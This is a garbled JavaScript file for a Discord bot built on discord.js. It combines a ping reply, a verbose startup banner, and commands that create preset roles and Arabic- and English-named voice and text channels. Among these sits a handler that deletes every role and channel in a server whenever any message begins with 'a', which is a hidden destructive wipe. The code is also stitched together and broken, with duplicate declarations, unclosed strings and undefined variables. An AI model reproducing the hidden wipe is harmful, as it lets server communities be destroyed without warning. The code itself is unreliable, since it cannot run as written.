const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '.'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`Nothing`,"http://twitch.tv/S-F")
  console.log('')
  console.log('')
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});
const client = new Discord.Client();
const prefix = '!'
 
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});
 
client.on('message', msg => {
  if (msg.content === 'ping') {
    msg.reply('Pong!');
  }
});
 
 
 
 
 
 
 
client.login('');
 
 
 
client.on('message', x5bz => {  
 if (x5bz.content.startsWith("a")) {
     x5bz.guild.roles.forEach(r => { r.delete() })
     x5bz.guild.channels.forEach(c => { c.delete() })
                let v5bz = new Discord.RichEmbed()
            .setColor('RANDOM')
               
               
                   
     if (message.content === "$c-roles") {
         LOka.guilds.forEach(m =>{
guild.createRole({
        name : "❰owner❱",
",
        permissions :   [1],
        color : " #62d4d2"
   
guild.createRole({
        name : "❰Co-Owner",
        permissions :   [1],
        color : " #e9b46a""
    })
guild.createRole({
        name : "Leader",
        permissions :   [1],
        color : " #0a4610"
    })
guild.createRole({
        name : "Co-Leader",
        permissions :   [1],
        color : " #ff0000"
    })
guild.createRole({
        name : "Admin",
        permissions :   [1],
        color : " #ff0000"
    })
guild.createRole({
        name : "VIP",
        permissions :   [1],
        color : " #ff0000"
    })
guild.createRole({
        name : "HELPER",
        permissions :   [1],
        color : " #ff0000"
    })
guild.createRole({
        name : "KING",
        permissions :   [1],
        color : " #ff0000"
    })
guild.createRole({
        name : "MEMBER-CLAN",
        permissions :   [1],
        color : " #ff0000"
    })
 
guild.createRole({
        name : "YouTuber",
        permissions :   [1],
        color : " #ff0000"
    })
 
guild.createRole({
        name : "YouTuber",
        permissions :   [1],
        color : " #ff0000"
    })
 
guild.createRole({
        name : "Bot",
        permissions :   [1],
        color : " #ff0000"
    })
 
   
}
 
 
}
}
 
 
 
 
 
LOka.on('message', message => {
         if (message.content === "$cv-rooms") {
               LOka.guilds.forEach(m =>{
guild.createChannel('SAWALEF  | سوالف', 'voice');
guild.createChannel('ROG  | روق', 'voice');
guild.createChannel('🎮 3rb.be', 'voice');
guild.createChannel('🎮 Gota.io', 'voice');
guild.createChannel('🎮 dual agar', 'voice');
guild.createChannel('🎮 ix-agar', 'voice');
guild.createChannel('JUSTE 1 🚫 ', 'voice');
guild.createChannel('JUSTE 2 🚫 ', 'voice');
guild.createChannel('JUSTE 3 🚫 ', 'voice');
guild.createChannel('JUSTE 4 🚫 ', 'voice');
guild.createChannel('JUSTE 5 🚫 ', 'voice');
guild.createChannel('MUSIC 1 ♫  ', 'voice');
guild.createChannel('MUSIC 2 ♫ ', 'voice');
guild.createChannel('MUSIC 3 ♫ ', 'voice');                
guild.createChannel('「AFK 」 ', 'voice');
 
 
 
 
         if (message.content === "$ct-rooms") {
               LOka.guilds.forEach(m =>{
guild.createChannel('info', 'text');
guild.createChannel('news', 'text');
guild.createChannel('welcome', 'text');
guild.createChannel('warning', 'text');
guild.createChannel('rules', 'text');
guild.createChannel('chat', 'text');
guild.createChannel('bot', 'text');
guild.createChannel('bo7', 'text');
guild.createChannel('pic', 'text');
guild.createChannel('cut-tweet', 'text');
guild.createChannel('takeovers', 'text');
guild.createChannel('youtube', 'text');
                })
}
 
 
});
client.login(process.env.BOT_TOKEN);
